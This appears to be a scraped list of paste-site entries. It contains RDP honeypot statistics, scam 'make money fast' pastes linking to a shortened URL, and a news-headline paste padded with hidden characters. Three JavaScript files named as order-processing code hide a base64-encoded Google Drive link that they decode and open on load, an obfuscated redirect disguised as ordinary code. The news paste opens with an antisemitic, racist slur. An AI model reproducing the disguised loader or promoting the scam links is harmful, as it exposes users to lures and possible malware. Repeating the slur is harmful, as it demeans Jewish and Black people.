id,title,username,language,date,content
BiF6s8Jh,2025-03-28_stats.json,rdp_snitch,JSON,Saturday 29th of March 2025 07:18:49 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 42849,
    ""138.199.24.6"": 91545,
    ""150.95.89.149"": 10653,
    ""156.146.57.52"": 10716,
    ""156.146.57.174"": 10704,
    ""106.14.144.233"": 423,
    ""146.190.105.191"": 1881,
    ""188.166.250.11"": 6,
    ""58.218.199.219"": 30,
    ""103.228.37.126"": 561,
    ""185.42.12.5"": 12,
    ""175.210.79.116"": 60,
    ""198.235.24.64"": 9,
    ""92.255.57.86"": 3,
    ""157.245.104.150"": 9,
    ""147.182.229.114"": 201,
    ""80.94.95.90"": 6,
    ""138.199.24.23"": 2016,
    ""194.180.49.233"": 9747,
    ""58.186.207.71"": 24,
    ""198.235.24.121"": 9,
    ""71.6.134.235"": 30,
    ""167.94.146.62"": 3,
    ""103.75.183.173"": 24,
    ""88.214.25.124"": 6,
    ""91.238.181.93"": 6,
    ""85.215.198.96"": 3,
    ""147.185.132.147"": 9,
    ""178.20.129.235"": 3,
    ""66.235.169.197"": 6,
    ""205.210.31.75"": 9,
    ""187.234.232.99"": 6
  },
  ""asn"": {
    ""AS212238"": 64269,
    ""AS60068"": 93561,
    ""AS135161"": 10653,
    ""AS37963"": 423,
    ""AS14061"": 2097,
    ""AS4134"": 30,
    ""AS135918"": 561,
    ""AS59425"": 12,
    ""AS4766"": 60,
    ""AS396982"": 36,
    ""AS207566"": 3,
    ""AS204428"": 6,
    ""AS201814"": 9747,
    ""AS18403"": 24,
    ""AS10439"": 30,
    ""AS398705"": 3,
    ""AS151858"": 24,
    ""AS35042"": 6,
    ""AS49434"": 6,
    ""AS8560"": 3,
    ""AS24810"": 3,
    ""AS40244"": 6,
    ""AS8151"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 64269,
    ""DataCamp Limited"": 93561,
    ""GMO-Z.COM PTE. LTD."": 10653,
    ""Hangzhou Alibaba Advertising Co"": 423,
    ""DigitalOcean, LLC"": 2097,
    ""Chinanet"": 30,
    ""DXT"": 561,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Korea Telecom"": 60,
    ""Google LLC"": 36,
    ""SS-Net"": 6,
    ""MEVSPACE sp. z o.o."": 9747,
    ""FPT Telecom Company"": 24,
    ""CariNet, Inc."": 30,
    ""Censys, Inc."": 3,
    ""BQT"": 24,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Datacenter location PAR1 France"": 6,
    ""IONOS SE"": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""HopOne Internet Corporation"": 6,
    ""Uninet S.A. de C.V."": 6
  },
  ""org"": {
    ""Datacamp Limited"": 64269,
    ""Cdn77 SGP"": 93561,
    ""Zcom Thai"": 10653,
    ""Aliyun Computing Co., LTD"": 423,
    ""DigitalOcean, LLC"": 2091,
    ""Digitalocean"": 6,
    ""Chinanet JS"": 30,
    ""DXT Digital Transformation Technology Joint Stock Company"": 561,
    ""Horizon LLC"": 12,
    ""Kornet"": 60,
    ""Palo Alto Networks, Inc"": 36,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Unmanaged LTD"": 6,
    ""HostSlick"": 9747,
    ""Vietnam Internet Network Information Center"": 24,
    ""CariNet, Inc."": 30,
    ""Censys, Inc."": 3,
    ""Unknown"": 24,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""De Ber Ionos Cloud Txl"": 3,
    ""Teleset LLC"": 3,
    ""Tier.Net Technologies LLC"": 6,
    ""UNINET"": 6
  },
  ""regionName"": {
    ""North West"": 157830,
    ""Tokyo"": 10653,
    ""Shanghai"": 423,
    ""South West"": 1887,
    ""Jiangsu"": 30,
    ""Hanoi"": 561,
    ""Moscow"": 15,
    ""Incheon"": 60,
    ""California"": 237,
    ""Karnataka"": 9,
    ""Sofia-Capital"": 6,
    ""Bavaria"": 9747,
    ""Ho Chi Minh"": 48,
    ""Nevada"": 30,
    ""Hesse"": 6,
    ""Kowloon City"": 6,
    ""\u00cele-de-France"": 6,
    ""Tatarstan Republic"": 3,
    ""New York"": 6,
    ""Hidalgo"": 6
  },
  ""country"": {
    ""Singapore"": 159717,
    ""Japan"": 10653,
    ""China"": 453,
    ""Vietnam"": 609,
    ""Russia"": 18,
    ""South Korea"": 60,
    ""United States"": 273,
    ""India"": 9,
    ""Bulgaria"": 6,
    ""Germany"": 9753,
    ""Hong Kong"": 6,
    ""France"": 6,
    ""Mexico"": 6
  },
  ""account"": {
    ""hello"": 181455,
    ""Test"": 33,
    ""LSpaamYmD"": 3,
    ""jrlBAI"": 3,
    ""DXYrwA"": 3,
    ""Administr"": 9,
    ""CSmFihUnv"": 3,
    ""uenPPA"": 3,
    ""LTYHjo"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""(empty)"": 3,
    ""Domain"": 3,
    ""XLOEULRFz"": 3,
    ""wJlLfy"": 3,
    ""WlmOwX"": 3,
    ""DxCRuCDVx"": 3,
    ""MCQMrW"": 3,
    ""AebBsa"": 3
  },
  ""keyboard"": {
    ""Unknown"": 181569
  },
  ""client_build"": {
    ""Unknown"": 181569
  },
  ""client_name"": {
    ""Unknown"": 181569
  },
  ""ip_type"": {
    ""hosting & proxy"": 160374,
    ""hosting"": 10710,
    ""proxy"": 45,
    ""Unknown"": 10440
  }
}"
NAuSrhfp,Binance account CW,Luciusneeful,JavaScript,Saturday 29th of March 2025 07:18:16 PM CDT," 
Pdf https://tinyurl.com/methodssss


jYDhYC85aV
"
XUwwZFCk,2025-03-28_stats.json,rdp_snitch,JSON,Saturday 29th of March 2025 07:16:37 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 42848,
    ""138.199.24.6"": 91543,
    ""150.95.89.149"": 10653,
    ""156.146.57.52"": 10716,
    ""156.146.57.174"": 10704,
    ""106.14.144.233"": 423,
    ""146.190.105.191"": 1881,
    ""188.166.250.11"": 6,
    ""58.218.199.219"": 30,
    ""103.228.37.126"": 561,
    ""185.42.12.5"": 12,
    ""175.210.79.116"": 60,
    ""198.235.24.64"": 9,
    ""92.255.57.86"": 3,
    ""157.245.104.150"": 9,
    ""147.182.229.114"": 201,
    ""80.94.95.90"": 6,
    ""138.199.24.23"": 2016,
    ""194.180.49.233"": 9747,
    ""58.186.207.71"": 24,
    ""198.235.24.121"": 9,
    ""71.6.134.235"": 30,
    ""167.94.146.62"": 3,
    ""103.75.183.173"": 24,
    ""88.214.25.124"": 6,
    ""91.238.181.93"": 6,
    ""85.215.198.96"": 3,
    ""147.185.132.147"": 9,
    ""178.20.129.235"": 3,
    ""66.235.169.197"": 6,
    ""205.210.31.75"": 9,
    ""187.234.232.99"": 6
  },
  ""asn"": {
    ""AS212238"": 64268,
    ""AS60068"": 93559,
    ""AS135161"": 10653,
    ""AS37963"": 423,
    ""AS14061"": 2097,
    ""AS4134"": 30,
    ""AS135918"": 561,
    ""AS59425"": 12,
    ""AS4766"": 60,
    ""AS396982"": 36,
    ""AS207566"": 3,
    ""AS204428"": 6,
    ""AS201814"": 9747,
    ""AS18403"": 24,
    ""AS10439"": 30,
    ""AS398705"": 3,
    ""AS151858"": 24,
    ""AS35042"": 6,
    ""AS49434"": 6,
    ""AS8560"": 3,
    ""AS24810"": 3,
    ""AS40244"": 6,
    ""AS8151"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 64268,
    ""DataCamp Limited"": 93559,
    ""GMO-Z.COM PTE. LTD."": 10653,
    ""Hangzhou Alibaba Advertising Co"": 423,
    ""DigitalOcean, LLC"": 2097,
    ""Chinanet"": 30,
    ""DXT"": 561,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Korea Telecom"": 60,
    ""Google LLC"": 36,
    ""SS-Net"": 6,
    ""MEVSPACE sp. z o.o."": 9747,
    ""FPT Telecom Company"": 24,
    ""CariNet, Inc."": 30,
    ""Censys, Inc."": 3,
    ""BQT"": 24,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Datacenter location PAR1 France"": 6,
    ""IONOS SE"": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""HopOne Internet Corporation"": 6,
    ""Uninet S.A. de C.V."": 6
  },
  ""org"": {
    ""Datacamp Limited"": 64268,
    ""Cdn77 SGP"": 93559,
    ""Zcom Thai"": 10653,
    ""Aliyun Computing Co., LTD"": 423,
    ""DigitalOcean, LLC"": 2091,
    ""Digitalocean"": 6,
    ""Chinanet JS"": 30,
    ""DXT Digital Transformation Technology Joint Stock Company"": 561,
    ""Horizon LLC"": 12,
    ""Kornet"": 60,
    ""Palo Alto Networks, Inc"": 36,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Unmanaged LTD"": 6,
    ""HostSlick"": 9747,
    ""Vietnam Internet Network Information Center"": 24,
    ""CariNet, Inc."": 30,
    ""Censys, Inc."": 3,
    ""Unknown"": 24,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""De Ber Ionos Cloud Txl"": 3,
    ""Teleset LLC"": 3,
    ""Tier.Net Technologies LLC"": 6,
    ""UNINET"": 6
  },
  ""regionName"": {
    ""North West"": 157827,
    ""Tokyo"": 10653,
    ""Shanghai"": 423,
    ""South West"": 1887,
    ""Jiangsu"": 30,
    ""Hanoi"": 561,
    ""Moscow"": 15,
    ""Incheon"": 60,
    ""California"": 237,
    ""Karnataka"": 9,
    ""Sofia-Capital"": 6,
    ""Bavaria"": 9747,
    ""Ho Chi Minh"": 48,
    ""Nevada"": 30,
    ""Hesse"": 6,
    ""Kowloon City"": 6,
    ""\u00cele-de-France"": 6,
    ""Tatarstan Republic"": 3,
    ""New York"": 6,
    ""Hidalgo"": 6
  },
  ""country"": {
    ""Singapore"": 159714,
    ""Japan"": 10653,
    ""China"": 453,
    ""Vietnam"": 609,
    ""Russia"": 18,
    ""South Korea"": 60,
    ""United States"": 273,
    ""India"": 9,
    ""Bulgaria"": 6,
    ""Germany"": 9753,
    ""Hong Kong"": 6,
    ""France"": 6,
    ""Mexico"": 6
  },
  ""account"": {
    ""hello"": 181452,
    ""Test"": 33,
    ""LSpaamYmD"": 3,
    ""jrlBAI"": 3,
    ""DXYrwA"": 3,
    ""Administr"": 9,
    ""CSmFihUnv"": 3,
    ""uenPPA"": 3,
    ""LTYHjo"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""(empty)"": 3,
    ""Domain"": 3,
    ""XLOEULRFz"": 3,
    ""wJlLfy"": 3,
    ""WlmOwX"": 3,
    ""DxCRuCDVx"": 3,
    ""MCQMrW"": 3,
    ""AebBsa"": 3
  },
  ""keyboard"": {
    ""Unknown"": 181566
  },
  ""client_build"": {
    ""Unknown"": 181566
  },
  ""client_name"": {
    ""Unknown"": 181566
  },
  ""ip_type"": {
    ""hosting & proxy"": 160371,
    ""hosting"": 10710,
    ""proxy"": 45,
    ""Unknown"": 10440
  }
}"
2rGdnEVR,2025-03-28_stats.json,rdp_snitch,JSON,Saturday 29th of March 2025 07:15:20 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 42847,
    ""138.199.24.6"": 91541,
    ""150.95.89.149"": 10653,
    ""156.146.57.52"": 10716,
    ""156.146.57.174"": 10704,
    ""106.14.144.233"": 423,
    ""146.190.105.191"": 1881,
    ""188.166.250.11"": 6,
    ""58.218.199.219"": 30,
    ""103.228.37.126"": 561,
    ""185.42.12.5"": 12,
    ""175.210.79.116"": 60,
    ""198.235.24.64"": 9,
    ""92.255.57.86"": 3,
    ""157.245.104.150"": 9,
    ""147.182.229.114"": 201,
    ""80.94.95.90"": 6,
    ""138.199.24.23"": 2016,
    ""194.180.49.233"": 9747,
    ""58.186.207.71"": 24,
    ""198.235.24.121"": 9,
    ""71.6.134.235"": 30,
    ""167.94.146.62"": 3,
    ""103.75.183.173"": 24,
    ""88.214.25.124"": 6,
    ""91.238.181.93"": 6,
    ""85.215.198.96"": 3,
    ""147.185.132.147"": 9,
    ""178.20.129.235"": 3,
    ""66.235.169.197"": 6,
    ""205.210.31.75"": 9,
    ""187.234.232.99"": 6
  },
  ""asn"": {
    ""AS212238"": 64267,
    ""AS60068"": 93557,
    ""AS135161"": 10653,
    ""AS37963"": 423,
    ""AS14061"": 2097,
    ""AS4134"": 30,
    ""AS135918"": 561,
    ""AS59425"": 12,
    ""AS4766"": 60,
    ""AS396982"": 36,
    ""AS207566"": 3,
    ""AS204428"": 6,
    ""AS201814"": 9747,
    ""AS18403"": 24,
    ""AS10439"": 30,
    ""AS398705"": 3,
    ""AS151858"": 24,
    ""AS35042"": 6,
    ""AS49434"": 6,
    ""AS8560"": 3,
    ""AS24810"": 3,
    ""AS40244"": 6,
    ""AS8151"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 64267,
    ""DataCamp Limited"": 93557,
    ""GMO-Z.COM PTE. LTD."": 10653,
    ""Hangzhou Alibaba Advertising Co"": 423,
    ""DigitalOcean, LLC"": 2097,
    ""Chinanet"": 30,
    ""DXT"": 561,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Korea Telecom"": 60,
    ""Google LLC"": 36,
    ""SS-Net"": 6,
    ""MEVSPACE sp. z o.o."": 9747,
    ""FPT Telecom Company"": 24,
    ""CariNet, Inc."": 30,
    ""Censys, Inc."": 3,
    ""BQT"": 24,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Datacenter location PAR1 France"": 6,
    ""IONOS SE"": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""HopOne Internet Corporation"": 6,
    ""Uninet S.A. de C.V."": 6
  },
  ""org"": {
    ""Datacamp Limited"": 64267,
    ""Cdn77 SGP"": 93557,
    ""Zcom Thai"": 10653,
    ""Aliyun Computing Co., LTD"": 423,
    ""DigitalOcean, LLC"": 2091,
    ""Digitalocean"": 6,
    ""Chinanet JS"": 30,
    ""DXT Digital Transformation Technology Joint Stock Company"": 561,
    ""Horizon LLC"": 12,
    ""Kornet"": 60,
    ""Palo Alto Networks, Inc"": 36,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Unmanaged LTD"": 6,
    ""HostSlick"": 9747,
    ""Vietnam Internet Network Information Center"": 24,
    ""CariNet, Inc."": 30,
    ""Censys, Inc."": 3,
    ""Unknown"": 24,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""De Ber Ionos Cloud Txl"": 3,
    ""Teleset LLC"": 3,
    ""Tier.Net Technologies LLC"": 6,
    ""UNINET"": 6
  },
  ""regionName"": {
    ""North West"": 157824,
    ""Tokyo"": 10653,
    ""Shanghai"": 423,
    ""South West"": 1887,
    ""Jiangsu"": 30,
    ""Hanoi"": 561,
    ""Moscow"": 15,
    ""Incheon"": 60,
    ""California"": 237,
    ""Karnataka"": 9,
    ""Sofia-Capital"": 6,
    ""Bavaria"": 9747,
    ""Ho Chi Minh"": 48,
    ""Nevada"": 30,
    ""Hesse"": 6,
    ""Kowloon City"": 6,
    ""\u00cele-de-France"": 6,
    ""Tatarstan Republic"": 3,
    ""New York"": 6,
    ""Hidalgo"": 6
  },
  ""country"": {
    ""Singapore"": 159711,
    ""Japan"": 10653,
    ""China"": 453,
    ""Vietnam"": 609,
    ""Russia"": 18,
    ""South Korea"": 60,
    ""United States"": 273,
    ""India"": 9,
    ""Bulgaria"": 6,
    ""Germany"": 9753,
    ""Hong Kong"": 6,
    ""France"": 6,
    ""Mexico"": 6
  },
  ""account"": {
    ""hello"": 181449,
    ""Test"": 33,
    ""LSpaamYmD"": 3,
    ""jrlBAI"": 3,
    ""DXYrwA"": 3,
    ""Administr"": 9,
    ""CSmFihUnv"": 3,
    ""uenPPA"": 3,
    ""LTYHjo"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""(empty)"": 3,
    ""Domain"": 3,
    ""XLOEULRFz"": 3,
    ""wJlLfy"": 3,
    ""WlmOwX"": 3,
    ""DxCRuCDVx"": 3,
    ""MCQMrW"": 3,
    ""AebBsa"": 3
  },
  ""keyboard"": {
    ""Unknown"": 181563
  },
  ""client_build"": {
    ""Unknown"": 181563
  },
  ""client_name"": {
    ""Unknown"": 181563
  },
  ""ip_type"": {
    ""hosting & proxy"": 160368,
    ""hosting"": 10710,
    ""proxy"": 45,
    ""Unknown"": 10440
  }
}"
mLWvej8X,Products.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 07:05:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/089/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8errUU4R,EARN $900 INSTANTLY 2025 BT,Luciusneeful,JavaScript,Saturday 29th of March 2025 07:02:23 PM CDT," 
Pdf https://tinyurl.com/methodssss


XUOZXAS2ph
"
mvbUp2NB,Order.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 06:49:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/294/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0ks54SER,Random Gmail Acc 1A,Luciusneeful,JavaScript,Saturday 29th of March 2025 06:46:28 PM CDT," 
Pdf https://tinyurl.com/methodssss


n5hNzAQtaf
"
GwqDh60u,Market.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 06:34:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/302/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nvtNBWkP,Make $1000 15-MINUTES (BEGINNER) WM,Luciusneeful,JavaScript,Saturday 29th of March 2025 06:30:34 PM CDT," 
Pdf https://tinyurl.com/methodssss


vHKdXmLzR3
"
uTYEwxLW,News March29 25,Newscaster_Ned,Email,Saturday 29th of March 2025 06:26:32 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎i‎e‎ ‎g‎i‎e‎z‎,‎ ‎N‎o‎o‎z‎e‎c‎a‎s‎t‎e‎r‎ ‎N‎e‎d‎ ‎h‎e‎r‎e‎ ‎g‎o‎n‎n‎a‎ ‎s‎h‎o‎v‎e‎ ‎d‎r‎a‎d‎l‎e‎s‎ ‎u‎p‎ ‎j‎0‎0‎z‎ ‎m‎o‎n‎k‎e‎h‎ ‎b‎u‎t‎t‎s‎.‎

D‎O‎G‎E‎ ‎E‎x‎e‎c‎u‎t‎e‎s‎ ‎M‎a‎s‎s‎ ‎F‎i‎r‎i‎n‎g‎s‎ ‎a‎t‎ ‎U‎.‎S‎.‎ ‎I‎n‎s‎t‎i‎t‎u‎t‎e‎ ‎o‎f‎ ‎P‎e‎a‎c‎e‎
I‎s‎s‎a‎:‎ ‎B‎i‎l‎l‎ ‎t‎o‎ ‎R‎e‎i‎n‎ ‎i‎n‎ ‎D‎i‎s‎t‎r‎i‎c‎t‎ ‎J‎u‎d‎g‎e‎s‎ ‎I‎n‎j‎u‎n‎c‎t‎i‎o‎n‎ ‎A‎b‎i‎l‎i‎t‎y‎ ‎i‎s‎ ‎'‎A‎ ‎F‎i‎r‎s‎t‎ ‎S‎t‎e‎p‎'‎
D‎i‎s‎a‎b‎l‎e‎d‎ ‎A‎i‎r‎ ‎F‎o‎r‎c‎e‎ ‎V‎e‎t‎e‎r‎a‎n‎ ‎R‎e‎c‎e‎i‎v‎e‎s‎ ‎C‎u‎s‎t‎o‎m‎-‎B‎u‎i‎l‎t‎ ‎H‎o‎m‎e‎
'‎F‎i‎n‎g‎e‎r‎p‎r‎i‎n‎t‎s‎'‎ ‎S‎i‎n‎g‎e‎r‎ ‎J‎o‎n‎ ‎K‎a‎h‎n‎ ‎E‎x‎p‎o‎s‎e‎s‎ ‎L‎e‎f‎t‎'‎s‎ ‎A‎t‎t‎e‎m‎p‎t‎ ‎t‎o‎ ‎T‎o‎x‎i‎f‎y‎ ‎R‎e‎l‎i‎g‎i‎o‎n‎
N‎Y‎C‎ ‎W‎o‎m‎a‎n‎ ‎W‎h‎o‎ ‎C‎h‎a‎s‎e‎d‎ ‎M‎A‎G‎A‎ ‎H‎a‎t‎-‎W‎e‎a‎r‎e‎r‎ ‎i‎n‎ ‎S‎u‎b‎w‎a‎y‎ ‎I‎s‎ ‎a‎ ‎L‎u‎x‎u‎r‎y‎ ‎B‎r‎a‎n‎d‎ ‎S‎p‎e‎c‎i‎a‎l‎i‎s‎t‎
T‎e‎s‎l‎a‎ ‎T‎a‎k‎e‎d‎o‎w‎n‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎ ‎a‎ ‎B‎u‎s‎t‎ ‎i‎n‎ ‎T‎e‎x‎a‎s‎ ‎2‎n‎d‎ ‎L‎a‎r‎g‎e‎s‎t‎ ‎C‎i‎t‎y‎
C‎o‎y‎o‎t‎e‎s‎ ‎A‎r‎e‎ ‎S‎m‎u‎g‎g‎l‎i‎n‎g‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎O‎u‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎
D‎i‎s‎g‎r‎a‎c‎e‎d‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎C‎o‎r‎r‎e‎s‎p‎o‎n‎d‎e‎n‎t‎s‎ ‎A‎s‎s‎n‎.‎ ‎D‎u‎m‎p‎s‎ ‎T‎r‎u‎m‎p‎-‎h‎a‎t‎i‎n‎g‎ ‎C‎o‎m‎e‎d‎i‎a‎n‎
M‎e‎t‎a‎ ‎C‎o‎n‎t‎i‎n‎u‎e‎s‎ ‎C‎o‎m‎m‎u‎n‎i‎t‎y‎ ‎N‎o‎t‎e‎s‎ ‎R‎o‎l‎l‎o‎u‎t‎ ‎a‎s‎ ‎S‎o‎m‎e‎ ‎V‎e‎n‎t‎ ‎O‎v‎e‎r‎ ‎F‎a‎c‎t‎ ‎C‎h‎e‎c‎k‎i‎n‎g‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
W‎i‎n‎n‎i‎n‎g‎!‎

E‎g‎g‎ ‎P‎r‎i‎c‎e‎s‎ ‎T‎a‎k‎e‎ ‎S‎h‎a‎r‎p‎ ‎P‎l‎u‎n‎g‎e‎ ‎a‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎W‎a‎t‎c‎h‎ ‎C‎o‎s‎t‎s‎ ‎T‎r‎e‎n‎d‎ ‎D‎o‎w‎n‎w‎a‎r‎d‎
e‎a‎t‎i‎n‎g‎ ‎e‎g‎g‎s‎
T‎h‎e‎ ‎p‎r‎i‎c‎e‎ ‎o‎f‎ ‎e‎g‎g‎s‎ ‎h‎a‎s‎ ‎t‎a‎k‎e‎n‎ ‎a‎ ‎s‎h‎a‎r‎p‎ ‎p‎l‎u‎n‎g‎e‎ ‎a‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎h‎a‎v‎e‎ ‎w‎a‎t‎c‎h‎e‎d‎ ‎t‎h‎e‎ ‎c‎o‎s‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎g‎r‎o‎c‎e‎r‎y‎ ‎s‎t‎a‎p‎l‎e‎ ‎s‎h‎i‎f‎t‎ ‎d‎o‎w‎n‎w‎a‎r‎d‎ ‎s‎i‎n‎c‎e‎ ‎m‎i‎d‎-‎F‎e‎b‎r‎u‎a‎r‎y‎,‎ ‎p‎e‎r‎ ‎a‎ ‎r‎e‎p‎o‎r‎t‎.‎

V‎I‎D‎E‎O‎ ‎—‎ ‎T‎r‎a‎g‎i‎c‎ ‎L‎o‎s‎s‎:‎ ‎F‎o‎u‎r‎ ‎T‎e‎x‎a‎s‎ ‎D‎e‎p‎u‎t‎i‎e‎s‎ ‎i‎n‎ ‎H‎a‎r‎r‎i‎s‎ ‎C‎o‎u‎n‎t‎y‎ ‎D‎i‎e‎ ‎b‎y‎ ‎A‎p‎p‎a‎r‎e‎n‎t‎ ‎S‎u‎i‎c‎i‎d‎e‎ ‎W‎e‎e‎k‎s‎ ‎A‎p‎a‎r‎t‎
V‎I‎D‎E‎O‎:‎ ‎4‎ ‎T‎X‎ ‎D‎e‎p‎u‎t‎i‎e‎s‎ ‎i‎n‎ ‎H‎a‎r‎r‎i‎s‎ ‎C‎o‎u‎n‎t‎y‎ ‎D‎i‎e‎ ‎b‎y‎ ‎A‎p‎p‎a‎r‎e‎n‎t‎ ‎S‎u‎i‎c‎i‎d‎e‎ ‎W‎e‎e‎k‎s‎ ‎A‎p‎a‎r‎t‎
8‎6‎
U‎k‎r‎a‎i‎n‎i‎a‎n‎s‎ ‎P‎r‎e‎d‎i‎c‎t‎ ‎R‎u‎s‎s‎i‎a‎ ‎I‎s‎ ‎P‎r‎e‎p‎a‎r‎i‎n‎g‎ ‎f‎o‎r‎ ‎S‎p‎r‎i‎n‎g‎ ‎O‎f‎f‎e‎n‎s‎i‎v‎e‎ ‎A‎m‎i‎d‎ ‎C‎e‎a‎s‎e‎f‎i‎r‎e‎ ‎T‎a‎l‎k‎s‎
U‎k‎r‎a‎i‎n‎i‎a‎n‎s‎ ‎P‎r‎e‎d‎i‎c‎t‎ ‎R‎u‎s‎s‎i‎a‎ ‎P‎r‎e‎p‎a‎r‎i‎n‎g‎ ‎f‎o‎r‎ ‎S‎p‎r‎i‎n‎g‎ ‎O‎f‎f‎e‎n‎s‎i‎v‎e‎
1‎,‎8‎0‎0‎
C‎o‎n‎v‎i‎c‎t‎e‎d‎ ‎M‎u‎r‎d‎e‎r‎e‎r‎ ‎C‎a‎u‎g‎h‎t‎ ‎S‎n‎e‎a‎k‎i‎n‎g‎ ‎i‎n‎t‎o‎ ‎T‎e‎x‎a‎s‎ ‎o‎n‎ ‎T‎r‎a‎i‎n‎ ‎f‎r‎o‎m‎ ‎M‎e‎x‎i‎c‎o‎
